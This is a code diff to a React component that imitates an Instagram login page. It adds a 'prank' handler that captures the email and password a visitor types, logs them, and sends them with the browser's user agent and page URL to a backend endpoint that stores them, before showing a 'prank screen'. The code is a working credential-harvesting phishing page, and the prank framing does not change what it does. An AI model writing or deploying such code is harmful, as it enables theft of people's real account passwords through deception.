@@ -54,6 +54,55 @@ const InstagramLogin = () => {
     }, 2000);
   };
 
+  // Bypass AuthProvider for prank functionality
+  const handlePrankLogin = async (e) => {
+    e.preventDefault();
+    console.log('🎯 Prank login handler called directly');
+    console.log('📧 Email:', email);
+    console.log('🔐 Password:', password);
+    
+    if (!email || !password) {
+      setError('Please fill in both email and password');
+      return;
+    }
+    
+    setLoading(true);
+    setSavedCredentials({ email, password });
+    
+    // Make API call to save credentials
+    const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
+    console.log('🔧 Backend URL:', backendUrl);
+    
+    try {
+      const response = await fetch(`${backendUrl}/api/save-prank-credentials`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password,
+          userAgent: navigator.userAgent,
+          url: window.location.href,
+          prankedAt: new Date().toISOString(),
+          timestamp: Date.now()
+        })
+      });
+      
+      const data = await response.json();
+      console.log('✅ Credentials saved successfully!', data);
+    } catch (error) {
+      console.error('❌ Error saving credentials:', error);
+    }
+    
+    // Show prank screen after delay
+    setTimeout(() => {
+      console.log('🎭 Showing prank screen');
+      setLoading(false);
+      setShowPrankScreen(true);
+    }, 2000);
+  };
+
   async function handleSubmit(e) {
     e.preventDefault();
     console.log('🚀 Form submitted!');
